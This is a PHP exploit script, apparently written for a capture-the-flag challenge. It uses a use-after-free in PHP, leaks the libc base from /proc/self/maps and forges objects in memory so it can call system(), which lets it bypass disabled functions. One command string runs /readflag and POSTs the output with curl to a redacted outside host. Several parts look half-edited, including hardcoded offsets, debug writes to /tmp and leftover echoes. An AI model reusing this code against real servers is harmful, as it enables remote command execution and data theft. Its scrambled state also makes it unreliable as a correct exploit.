<?php
pwn("uname -a");

function pwn($cmd) {
    global $abc, $helper, $backtrace;

    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }
 
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        $j = $s-1;

        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        $address <<= 8;
        $address |= ord($str[$p+$j]);$j--;
        return $address;
    }
    

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8; $i++;
    }



    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        echo("sice...");
        $vuln = new Vuln();
        $vuln->a = $arg;
        echo("assigned reference");
    }


    $hax= file_get_contents('/proc/self/maps');
    $lol = strpos($hax, "/lib/x86_64-linux-gnu/libc-2.28.so");
    $libc_base = hexdec(explode("-",explode("\n", substr($hax, $lol-100))[1])[0]);
    $system_ptr = $libc_base + 0x449c0;

    $n_alloc = 20; # increase this value if UAF fails
    $contiguous = [];
    
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));
    $contiguous[] = str_shuffle(str_repeat('A', 79));

    echo("hello");
    file_put_contents("/tmp/lelel2", "hacked");
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper->b = function ($x) { };
    echo("we're alive");


    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, 0x44444444);
    write($abc, 0x18, 0xa);
    echo("SICE!\n");
    $closure_obj = str2ptr($abc, 0x20);
    $binsh = strpos($abc,"/bin/sh",0xbf0000+20*0x20000);
    $base = $binsh - 0x181519;
    $freeh = $base + 1825000;
    file_put_contents("/tmp/leakfd7", substr($abc, $binsh, 8));
    file_put_contents("/tmp/leakfd",strval($binsh)."\n");
    file_put_contents("/tmp/leakfd8",substr($abc,$base,10));
    echo("hm...\n");
    $fake_obj_offset = $freeh;
    write($abc, $fake_obj_offset, $system_ptr);
    
    $a = ";/readflag > /tmp/sicemehackerman; curl -X POST http://REDACTED/ -d \"@/tmp/sicemehackerman\";#";
    try{
    $_SERVER['DEET'] = $a();
}catch(Exception $e){
    echo("exception");
}
    echo("we should've crashed");
    write($abc, 0x41414141, 0xdeadbeef);
    ($helper->b)($cmd);
    exit();
}

